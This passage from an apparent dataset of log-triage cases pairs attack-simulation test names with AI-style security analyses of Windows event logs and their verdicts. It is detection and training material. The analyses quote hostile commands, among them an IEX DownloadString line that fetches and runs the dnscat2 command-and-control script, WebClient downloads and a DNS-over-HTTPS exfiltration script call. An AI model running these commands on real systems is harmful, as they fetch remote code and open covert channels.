   - The `Sysmon` logs show repeated executions of the `wevtutil.exe` by the user `admin_test`. Although `wevtutil` is a legitimate tool used for managing event logs, its use in this context, especially in conjunction with Powershell script execution, might suggest an attempt to clear or manipulate event logs to cover tracks.

3. **Command Execution and Process Creation:**
   - There are entries related to common Windows utilities such as `whoami.exe`, `hostname.exe`, and `conhost.exe`. While these could be routine administrative tasks, their execution around the same time frame as the PowerShell activities might suggest reconnaissance or environment profiling actions, possibly conducted by a malicious actor to understand the operating environment.

**Assessment of Malicious Activity or Compromise:**

The combination of executing a PowerShell script from an image file with decoding and executing hidden content, potentially obscured via steganography, is highly indicative of malicious intent. Furthermore, using built-in utilities like `wevtutil.exe` for event log manipulation is a known tactic to evade detection by hindering forensic investigation.

### Final Assessment
- **MALICIOUS:** Given the observed behavior, which aligns with techniques typically used in cyber attacks (e.g., using PowerShell for executing hidden scripts, possibly clearing event logs), it's reasonable to conclude that these logs indicate malicious activity.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected host (`Server002`) from the network to prevent further propagation of the suspected malicious activity.

2. **Detailed Forensics:**
   - Perform a thorough forensic analysis of the system to uncover any additional payloads, persistence mechanisms, or data exfiltration attempts.
   - Analyze the decoded PowerShell scripts (`result.ps1` and `textExtraction.ps1`) to understand the payload and its intent.

3. **Log Review and Correlation:**
   - Correlate these findings with logs from network devices, security appliances, and other endpoints to determine the full scope of the compromise.

4. **Incident Response:**
   - Initiate an incident response procedure to mitigate the identified threats and patch any vulnerabilities that may have been exploited.
   - Engage cybersecurity experts or response teams if internal capabilities are insufficient.

5. **Audit and Monitoring:**
   - Increase monitoring on PowerShell activities and administrative tools to detect similar behaviors in the future.
   - Conduct regular audits of privileged account activities (`SERVER002\admin_test`) to identify potential misuse or compromise."
Download a file using wscript,"After careful analysis of the provided Windows event logs, several activities stand out that warrant further attention:

1. **Command Execution by `cmd.exe` with Embedded Script (VBS) Execution**:
   - The log entry shows the PowerShell process executing a command which includes running `wscript.exe` with a VBS script (`data-download-file.vbs`) located in a temporary directory. This is suspicious as it may indicate an attempt to download or execute a malicious script file.

2. **Frequent Execution of `MicrosoftEdgeUpdate.exe` from Temporary and System Directories**:
   - `MicrosoftEdgeUpdate.exe` appears multiple times with various command-line arguments typically found in scheduled tasks or services (`/regserver`, `/svc`, `/update`). While these activities could be legitimate, the execution from temporary folders and concurrent process spawning can also be indicative of tampering or unauthorized software version checks outside regular update channels.

3. **Use of Built-in Windows Administrative Tools**:
   - Processes like `wevtutil.exe` and `conhost.exe` are seen repeatedly, often accompanying activities involving elevated privileges. These tools can be leveraged by malicious actors for reconnaissance, evasion, or to hide tracks by clearing event log data.

4. **Frequent Execution of Diagnostic Tools (`hostname.exe`, `whoami.exe`)**:
   - Although using `whoami.exe` and `hostname.exe` could be normal for diagnosing issues or checking system identity, their repeated use in a short time frame and under an administrative user account suggests potential misuse for privilege or information gathering.

Based on the above observations, the activities in these logs, especially the execution of a script from a temporary directory and the unusual frequency of administrative tool execution, suggest higher scrutiny:

**Assessment and Guidance:**

- **Resolution: SUSPICIOUS**
  - There is no definitive indicator of a fully perpetrated compromise, but the behaviors observed warrant deeper investigation.
  - Verify the legitimacy of the VBS script being executed. Check for any related known threats by performing a hash or signature analysis.
  - Further examination of `MicrosoftEdgeUpdate.exe` processes and their origins, checking whether they align with legitimate update schedules or if they potentially mask an intruder activity.
  - Investigate the usage of built-in tools like `wevtutil.exe` and `conhost.exe` around the same timeframe for potentially related unauthorized activities.
  - Review user activity logs for `SERVER002\\admin_test` for any unauthorized or unusual actions in conjunction with the listed activities.

**Recommended Actions:**

- Enhance monitoring and enable alerts for any future similar executions.
- Conduct a thorough review of the suspicious user account for abnormalities or breaches in user activity.
- Check for potential unauthorized script files or executables on the system, focusing on temporary and application data directories.
- Analyze network traffic activity corresponding to these timestamps for any external communicating IPs associated with known malicious actors or patterns."
Malicious User Agents - CMD,"Upon analyzing the provided Sysmon logs from the Windows event collection, several observations stand out that require a closer look:

1. **Microsoft Edge Update Activity**:
   - The logs depict frequent executions of ""MicrosoftEdgeUpdate.exe"" which appears to be a legitimate component related to Microsoft Edge updates. These executions primarily occur under the ""NT AUTHORITY\SYSTEM"" context. 
   - The command line arguments, image paths, and actions are consistent with typical operations of a legitimate auto-update system. Hence, no malicious activity is observed in these events.

2. **Unnecessary and Frequent Use of System Utilities**:
   - Multiple invocations of PowerShell and `wevtutil.exe` (Event log utility) under the user account ""SERVER002\admin_test"" raise some concerns. Although no direct signs of malicious activity are seen, the pattern suggests use outside its routine operational context.
   - Use of PowerShell might be legitimate, but also can be indicative of reconnaissance or poorly hidden administrative activities. 

3. **Command Prompt `cmd.exe` Usage**:
   - There are several instances of `cmd.exe` being used to run `curl.exe` commands to perform HTTP requests to ""www.google.com"".
   - The command-line involves using different user-agent strings, typically seen in techniques used to probe network access or simulate different client types. This raises a flag as it is unusual behavior for any regular process inside a corporate network and potentially indicates an attempt at stealthy communications or probing external sites.

4. **Batch Curl Execution**:
   - The repeated and batch nature of the curl executions with varied user-agent suggests automated scripting possibly with testing or probing intent. The user account involved ""SERVER002\admin_test"" executed these potentially unnecessary network calls that are suspicious unless explicitly justified for operational reasons.

5. **Executable Context and Directories**:
   - The executions and executions paths are consistent with standard Windows features and Microsoft Edge update processes, which weigh less towards a security incident.
   
### Conclusion:

The analysis of the logs points predominantly to BENIGN activity in the sense of the Edge Update processes running as intended by design. However, the use of `curl` to access external network resources using multiple user-agent strings as well as repeated executions of `wevtutil` and `PowerShell` by the user with admin rights (`admin_test`) calls for a red flag.

**Final Assessment: SUSPICIOUS**

**Recommendation to proceed:**
- Further review of user activity and the context around admin_test initiated tasks is advised.
- Validate with the user or system owner the intention and necessity behind the curl commands with multiple user-agent strings; this could indicate a breach or misconfigured script.
- If justified activities are not confirmed, consider containment and further monitoring or forensic examination of the specific activities to rule out any breach."
Windows - PowerShell Download,"Upon analyzing the provided Windows event logs, there are a few key points to consider regarding potentially suspicious or malicious activity:

### 1. PowerShell Activity:
The PowerShell logs indicate the execution of several commands via the PowerShell console, specifically downloading a file from an external source:

- **PowerShell Command:** `(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt"", ""$env:TEMP\\file-license.txt"")`

This command downloads a text file from an online repository to a local temporary directory. While downloading a file using PowerShell is not inherently malicious, it becomes suspicious when occurring unexpectedly or without proper context, especially in environments where such behavior is not typical.

### 2. Process Creation and Execution:
The Sysmon logs show a series of events related to process execution, including EdgeUpdate activity, which appears to be initiated and executed under the SYSTEM account:

- The processes related to Microsoft Edge Update reference typical update and service registration actions (`/update`, `/svc`, `/regserver`), generally benign if related to scheduled software update tasks.
  
- Another PowerShell process is recorded with a similar download command pattern, initiated by a user session (admin_test), suggesting a deliberate action requiring context for justification.

### 3. Use of System Utilities:
There are executions of Windows system utilities such as `wevtutil.exe` and `whoami.exe` by the user `admin_test`:

- **Execution of wevtutil and whoami by `admin_test`**: The use of these utilities for event log management or querying current user info could be part of normal administrative tasks but should be scrutinized if the timing or frequency is atypical for this user account.

### 4. Integrity and Context:
The actions observed could be considered suspicious depending on the context:

- **Downloading Files Using PowerShell by Non-Admins:** A user aptly named `admin_test` performing these activities requires verification. If `admin_test` is known for such tasks under legitimate processes, this might not trigger further action. However, if unexpected, this could warn of policy breaches or insider activity requiring audit.

- **SYSTEM Integrity Level:** The noted system processes under `IntegrityLevel: System` suggest higher privileges typically used for critical operations or updates, but combined with unsolicited network access, invites a deeper investigation.

### Conclusion:
Based on the analysis of logs, the PowerShell download behavior, and the use of administrative tools without explicit context, the activity should be classified as **SUSPICIOUS**. There is no definitive indication of outright malicious activity, but the pattern requires further investigation to confirm the intent and legitimacy of actions.

### Recommended Actions:
1. **Verify Intent:** Confirm with the user `admin_test` or related responsible parties the intent behind file downloads and executions.
2. **Review Security Policy Compliance:** Ensure such operations conform to cybersecurity policies regarding software management and external downloads.
3. **Network and Endpoint Monitoring:** Implement or review endpoint protections to alert when uncommon processes access external resources or leverage administrative tools.
4. **Audit Privileged Accounts:** Reassess the scope and usage of accounts with elevated privileges to avoid potential exploits from insider threats or compromised admin accounts."
DNS over HTTPS Long Domain Query,"Upon reviewing the provided Windows event logs, here is the detailed analysis and evaluation:

### Analysis of Logs:

1. **Security Log:**
   - Events 4616 are logged concerning “Microsoft-Windows-Security-Auditing”, showing a time change operation performed by a system process (svchost.exe). The time discrepancy is approximately 15 seconds and appears as a regular time correction, often performed by Windows Time Service. There are no apparent indicators of malicious activity in this context.

2. **System Log:**
   - Events show activities linked to the system’s time service making a time adjustment using a reliable source (time.windows.com) and general kernel updates. These appear standard and do not display any evidence of anomalous or suspicious behaviors.

3. **Sysmon Log:**
   - It reports several Process Create (Event ID 1) and Process Terminate (Event ID 5) events for commonly used Windows processes such as wevtutil.exe, conhost.exe, and PowerShell.exe.
   - However, a notable PowerShell execution is recorded, marked with:
     - CommandLine: `""powershell.exe"" & {Set-Location \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\\""\"", .\\data\\src\\data-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain filefilefilefilefileredte -QueryType TXT}`
   - This PowerShell script invocation with external server interaction might warrant attention as a potential indicator of data exfiltration or other suspicious activity. 

4. **Application Log:**
   - Contains event entries related to ""edgeupdate"" service operations, described as ""Service stopped"", which are normal when the Edge update process completes.

5. **Windows PowerShell Log:**
   - Confirms PowerShell script execution and recognizes the registry, alias, and environment starting state tied to the PowerShell host session highlighted in the Sysmon Log. The specific script and command being run appear unusual, warranting further scrutiny.

### Assessment:
Despite conventional benign activities visible in most logs, the PowerShell command execution stands out for being excessive in the context. The script accesses a subdomain and DoH (DNS over HTTPS) endpoint using PowerShell with a complex command line. 

This nature of script execution potentially ties into script-based attacks or unauthorized data access and exfiltration methods, as it indicates using a script (.ps1) that interacts with an external DNS service (https://8.8.8.8) and directs queries. 

### Threat/Risk:
- The use of PowerShell with such command-line arguments may point to attempts by a malicious actor to hide network communications through DNS over HTTPS or exploit systems via script, given it was executed from a temporary location.

### Guidance:
- Recommend isolation and detailed inspection of the system to ensure it hasn’t been compromised.
- Verify the integrity and purpose of the involved PowerShell script.
- Audit and potentially block any unauthorized modifications and external connections initiated from sensitive systems.
- Use this finding to enhance monitoring rules for similar activities.

### Conclusion: 
Resolution: **SUSPICIOUS**

While routine system updates and service changes are identified, the PowerShell activity with external query potentials deserves further investigation to rule out or confirm malicious intent. It is crucial to assess this context thoroughly to decide whether it’s a legitimate administrative or a threat actor’s action."
DNS C2,"Based on a detailed analysis of the provided Windows event logs, several observations and findings can be made. 

### Observations:

1. **PowerShell Activity:**
   - There are events showing the execution of a PowerShell script via `powershell.exe` which downloads a script from a GitHub URL using `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')`. The script appears to initiate a `Start-Dnscat2` connection, indicating potential remote communication, typically used in C2 (Command and Control) scenarios.

2. **Process Creation and Execution:**
   - Numerous processes such as `HOSTNAME.EXE`, `whoami.exe`, `svchost.exe`, and others are standard system processes. However, their execution context and overlaps with unusual PowerShell commands and potentially malicious scripts raise concerns.
   - Activities involving `wevtutil.exe` and `conhost.exe` are visible, which may be benign administrative activities, yet they coincide with other suspicious behavior.

3. **Security Log Analysis:**
   - Repeated Login events (ID 4624) and Special Privilege Assignments (ID 4672) for accounts like SYSTEM are present but not inherently malicious, needing cross-referencing with scheduled/system tasks.
   - Multiple events with ID 5379 reflect credential accesses which failed (ReturnCode: 3221226021), often indicating unsuccessful attempts to acquire sensitive credentials, which is suspicious behavior.

4. **EdgeUpdate Process Activity:**
   - Frequent creation and execution of `MicrosoftEdgeUpdate.exe` from different directories suggests software update activities. However, the overlap and timing with potentially malicious PowerShell activity warrant examination.

5. **Sysmon Logging:**
   - There are new process creation logs from `Sysmon` which indicate execution of potentially unauthorized applications or scripts, relevant to the PowerShell activity noted above.

6. **Time Discrepancies and Adjustments:**
   - Kernel-General event logs show some system time changes, which without a reasonable administrative explanation could indicate tampering or artifacts of tumultuous system or network time settings.

### Conclusion:

Given the presence of PowerShell scripts downloading and executing potentially malicious content alongside system processes that could be leveraged for privilege escalation and credential theft, the logs strongly suggest a compromise or malicious activity.

### Assessment:
- **Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the system from the network to prevent further propagation or data exfiltration.
   - Conduct memory analysis to uncover any further indicatives of active threats.
   - Review endpoint and network security configurations to identify and close security gaps.

2. **Further Investigation:**
   - Analyze the full PowerShell activity, particularly the script downloaded, to assess the impact and footprint.
   - Audit user account activities, especially those involved in privilege escalations and unnoticed logins.

3. **Remediation and Monitoring:**
   - Clean and restore affected systems.
   - Implement stricter PowerShell execution policies.
   - Employ continuous monitoring solutions to detect and respond to future anomalous activities.

These steps will help ensure malware eradication and future vulnerability mitigation."
Telnet C2,"The analysis of the provided logs focuses on identifying any signs of malicious activity, such as unusual process behaviors, suspicious command-line arguments, potential privilege escalation, or other indicators of compromise.

**Application Log:**
- The Application log primarily contains events related to the stopping of Microsoft Edge Update service on ""Server002"". There is no evidence of any suspicious activity here as service restarts/stops could be a part of normal update or maintenance procedures.

**PowerShell Log:**
- The PowerShell log includes the execution of a command invoking ""telnet_client.exe"" on localhost (127.0.0.1) at port 23. This particular behavior is anomalous as Telnet is generally considered insecure and less commonly used in modern environments. Moreover, the execution of an application from the ""Temp"" directory via PowerShell is suspicious, as it can be indicative of a script that could potentially be used for unauthorized activities. This requires further analysis.

**Sysmon Log:**
- There are numerous instances of legitimate system binaries like ""conhost.exe"", ""whoami.exe"", ""hostname.exe"", and ""wevtutil.exe"" being executed by ""SERVER002\admin_test"". These activities, on their own, do not indicate malicious intent, but their concurrent execution and the use of non-standard locations for running MicrosoftEdgeUpdateSetup_X86 and other executables indicate suspicious behavior that warrants further investigation.
- Notably, the Sysmon logs indicate the execution of processes related to Microsoft Edge Update but emanating from temporary directories, which is atypical for software updates. This unusual behavior raises a red flag for a potential privilege escalation or persistence mechanism through abuse of legitimate software or disguised malware.

**Conclusion:**
Given the execution of telnet_client.exe over PowerShell from a temporary location, and updates running from temporary directories, there are credible indicators of potential suspicious activity.

**Resolution:**
- **SUSPICIOUS**: The activities logged, especially the PowerShell and Sysmon events, raise suspicion due to the execution of applications from the Temp directory and connections over Telnet, which may pose a risk to the system's security. It's recommended to conduct further investigations including:
  - Validate the integrity and legitimacy of ""telnet_client.exe"" and other executables run from non-standard directories.
  - Check for any unauthorized file modifications or network connections.
  - Comprehensive review of user activities under ""SERVER002\admin_test"" and verification of update processes.

Further action may involve scanning for malware, ensuring security policies prevent execution from Temp directories, and vigilance against potential lateral movement."
Malicious User Agents - Powershell,"Upon analyzing the provided Windows event logs, here is a detailed assessment:

### Security Log:
- **Event ID 4799** indicates the addition of a user to a group (`TargetUserName: Users` in the `Builtin` domain). The process responsible is `setup.exe` under the EdgeUpdate directory. This could suggest routine software installation or updates where permissions are temporarily elevated.

### PowerShell Log:
- The PowerShell logs show multiple `Invoke-WebRequest` commands targeting `www.google.com` with various User-Agent strings. This activity:
  - Involves using a set of User-Agent strings that mimic different browser environments.
  - These actions often indicate network reconnaissance or testing, which can be suspicious if not explicitly authorized.

### Application Log:
- **Event ID 16384** from the Software Protection Platform Service is usual for time synchronization and licensing checks. No suspicious activity here.

### System Log:
- **Event ID 35** indicates time synchronization with `time.windows.com`, which is standard behavior for Windows systems.

### Sysmon Log:
- Multiple entries show process executions for system utilities such as `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and various EdgeUpdate installers (`setup.exe`). 
  - The execution of `whoami.exe` and `hostname.exe` suggests information gathering that may be benign or used for reconnaissance.
  - The presence of Edge setup processes with system-level permissions is typical during software installation or update routines.
  - Use of `wevtutil.exe` can be typical, but if it were used to manipulate or clear event logs without authorization, it would be concerning.
  
### Key Observations:
1. The PowerShell activity with `Invoke-WebRequest` using modified User-Agent strings is unconventional unless explicitly authorized. It may suggest an attempt to probe network defenses.
2. The Sysmon entries indicating the execution of `whoami.exe` and similar utilities could be standard system queries by an admin, but also could indicate suspicious activity aligned with reconnaissance.
3. The EdgeUpdate installer processes running as `NT AUTHORITY\SYSTEM` are legitimate if performing authorized installations or updates. 

### Resolution:
**SUSPICIOUS** - The logs contain indications of activities that deviate from normal behavior, particularly the unconventional PowerShell commands and the utilization of User-Agent strings, which necessitates further investigation. Actions like verifying the legitimacy and approval of these commands should be taken. 

### Guidance:
- Confirm the legitimacy of the PowerShell scripts and cross-check with known legitimate activities or scripts used within the organization.
- Review the logs associated with the manipulation of user groups to ensure this aligns with standard operations.
- Ensure that `wevtutil.exe` usage wasn't aimed at altering or cleansing logs maliciously.
- Investigate the context and purpose of information-gathering commands executed by administrators or other users on `Server002`."
File Download via PowerShell,"Upon analyzing the provided Windows event logs, several areas warrant attention due to their potential indicators of suspicious activity:

### Breakdown of Logs:

#### **Application Log:**
- The entry references the Software Protection Platform Service, which is generally responsible for license management. A single entry here doesn't provide much context, but no immediate malicious indicators are evident from this alone.

#### **Security Log:**
- Events with ID 4616 involve a time change in the system. The Process ""C:\Windows\System32\svchost.exe"" is involved. Time changes could indicate attempts to manipulate log data or bypass security measures that depend on time. While svchost.exe is a legitimate process, its use could be suspect if involved in unauthorized time changes.

#### **Windows PowerShell Log:**
- PowerShell activity invoking `(New-Object Net.WebClient).DownloadString(...)`. This kind of command is often used in scripts to download and execute content from the internet. The execution of this script could potentially download and run malicious content, making it a significant indicator of suspicious, if not malicious, behavior.

#### **System Log:**
- Contains time change events aligning with the Security log, further reinforcing the aforementioned point that the system time was altered. The changes by `svchost.exe` are suspect, especially when aligned with potential PowerShell misuse.

#### **Sysmon Log:**
- Numerous occurrences of system utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and PowerShell. The execution of `whoami.exe` and `wevtutil.exe` could indicate reconnaissance or event log clearing attempts, respectively. Alongside PowerShell script executions, these actions suggest potential malicious activity aimed at gathering information and possibly logging destructive activity.

### Summary of Findings:

1. **PowerShell Abuse:** The PowerShell logs indicate potentially malicious commands using `New-Object Net.WebClient` to download content from the web, which can lead to the execution of unverified code.
   
2. **Time Change Events:** The alteration of system time twice within a brief period could be indicative of an attempt to manipulate event logging or bypass time-based security mechanisms. 

3. **System and Utilities Usage:** The repeated invocation of `whoami.exe` and `wevtutil.exe`, alongside manipulation of system time and PowerShell usage, represent a suspicious pattern often seen in reconnaissance and privilege escalation or information concealment tactics.

### Resolution:

**SUSPICIOUS**

While there isn't absolute evidence of active malicious activity, the PowerShell use pattern, combined with unauthorized time changes and systematic use of certain Windows utilities, suggests potentially malicious intentions or behaviors that warrant further investigation to confirm if malicious actions have taken place.

**Guidance:**
- Conduct a thorough forensic analysis of downloaded files and scripts executed via PowerShell.
- Review user access and activities around the time changes to identify unauthorized behavior.
- Check for any other related incidents or unusual system behavior in logs.
- Consider deploying further monitoring around PowerShell execution and use of system utilities that could indicate privilege escalation or log tampering."
